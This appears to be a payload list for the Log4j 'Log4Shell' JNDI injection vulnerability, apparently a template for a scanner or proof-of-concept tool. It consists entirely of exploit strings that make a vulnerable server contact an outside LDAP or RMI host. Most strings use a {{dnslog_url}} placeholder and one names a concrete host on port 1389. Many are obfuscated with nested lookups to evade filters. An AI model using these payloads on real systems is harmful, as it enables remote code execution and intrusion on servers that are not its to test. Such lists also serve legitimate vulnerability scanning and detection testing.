```
${jndi:ldap://{{dnslog_url}}/poc}
${jndi:ldap://{{dnslog_url}}/ poc}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{dnslog_url}}poc}
${${::-j}ndi:rmi://{{dnslog_url}}/poc}
${${lower:jndi}:${lower:rmi}://{{dnslog_url}}/poc}
${${lower:${lower:jndi}}:${lower:rmi}://{{dnslog_url}}/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{dnslog_url}}/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{dnslog_url}}/poc}
${${aaa:bbb:-j}ndi:rmi://{{dnslog_url}}/poc}
${${:::::::::-j}ndi:rmi://{{dnslog_url}}/poc}
${${:p:q::zz::::::::-j}ndi:rmi://{{dnslog_url}}/poc}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{dnslog_url}}/poc}
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{dnslog_url}}/poc}
${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:1}:}}}ldap://mydogsbutt.com:1389/o}
```